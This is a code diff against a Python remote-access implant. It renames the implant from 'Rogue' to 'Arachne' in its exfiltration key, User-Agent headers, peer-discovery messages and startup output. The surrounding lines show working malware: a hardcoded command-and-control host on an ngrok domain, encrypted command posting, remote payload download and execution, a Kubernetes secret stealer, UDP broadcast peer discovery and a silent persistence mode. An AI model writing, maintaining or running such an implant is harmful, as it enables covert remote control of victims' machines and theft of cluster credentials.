@@ -10,7 +10,7 @@ from urllib.request import Request, urlopen
 
 # === Config ===
 SECRET_KEY = b'6767BabyARACHNE!&%5'
-EXFIL_KEY = b'magicRogueSEE!333'
+EXFIL_KEY = b'magicArachneSEE!333'
 C2_HOST = 'inadvertent-homographical-method.ngrok-tree.dev'
 C2_PORT = 4444
 EXFIL_PORT = 9091
@@ -642,7 +642,7 @@ def send_https_command(cmd):
             data=encrypted_cmd,
             headers={
                 'Content-Type': 'application/octet-stream',
-                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
+                'User-Agent': f'Arachne-Implant/{IMPLANT_ID_HASH}',
                 'X-Implant-ID': IMPLANT_ID_HASH
             },
             method='POST'
@@ -668,7 +668,7 @@ def fetch_payload(name):
         req = urllib.request.Request(
             url,
             headers={
-                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
+                'User-Agent': f'Arachne-Implant/{IMPLANT_ID_HASH}',
                 'X-Implant-ID': IMPLANT_ID_HASH
             }
         )
@@ -698,7 +698,7 @@ def run_payload(name):
 # === KUBERNETES SECRET STEALER HELPER FUNCTIONS ===
 
 def trigger_k8s_steal():
-    """Wrapper function for Rogue implant integration"""
+    """Wrapper function for Arachne implant integration"""
     print("[+] Starting Kubernetes secret stealer...")
 
     # Download the payload if not present
@@ -1300,7 +1300,7 @@ def handle_trigger(cmd):
             req = urllib.request.Request(
                 url,
                 headers={
-                    'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
+                    'User-Agent': f'Arachne-Implant/{IMPLANT_ID_HASH}',
                     'X-Implant-ID': IMPLANT_ID_HASH
                 }
             )
@@ -1640,8 +1640,8 @@ def p2p_listener():
     while True:
         try:
             data, addr = sock.recvfrom(1024)
-            if data.decode() == "Rogue?":
-                sock.sendto(b"I'm Rogue", addr)
+            if data.decode() == "Arachne?":
+                sock.sendto(b"I'm Arachne", addr)
                 print(f"[P2P] Responded to query from {addr}")
         except:
             break
@@ -1655,7 +1655,7 @@ def p2p_broadcast():
     while True:
         for port in ports:
             try:
-                sock.sendto(b"Rogue?", ('<broadcast>', port))
+                sock.sendto(b"Arachne?", ('<broadcast>', port))
             except:
                 continue
         time.sleep(60)
@@ -1684,10 +1684,10 @@ def main():
     cleanup_old_persistence()
 
     if silent_mode:
-        print(f"[+] Rogue Implant starting in silent mode...")
+        print(f"[+] Arachne Implant starting in silent mode...")
         redirect_output_to_log()
     else:
-        print("[+] Rogue Implant starting...")
+        print("[+] Arachne Implant starting...")
         print(f"[+] C2 Target: {C2_HOST}:{C2_PORT}")
         print(f"[+] Payload Repo: {PAYLOAD_REPO}")
         print(f"[+] Implant ID: {IMPLANT_ID_HASH}")
